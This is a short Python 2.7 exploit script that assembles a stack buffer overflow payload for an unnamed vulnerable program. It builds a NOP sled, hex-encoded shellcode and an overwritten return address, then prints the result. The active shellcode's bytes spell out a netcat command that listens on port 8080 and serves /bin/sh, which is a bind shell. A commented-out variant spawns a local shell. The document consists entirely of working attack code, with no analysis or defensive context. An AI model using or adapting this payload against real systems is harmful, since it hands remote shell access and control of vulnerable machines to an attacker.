# !/bin/python2.7
import struct

# shell_code = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shell_code =  b""
shell_code += "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e"
shell_code += "\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80"
shell_code += "\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d"
shell_code += "\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23"
# print len(shell_code)
offset = "\x90" * (520 - len(shell_code))
# 0x7fffffffe140
rip = struct.pack('Q', 0x7fffffffe028)

payload = offset + shell_code + rip
# print len(payload)
print payload

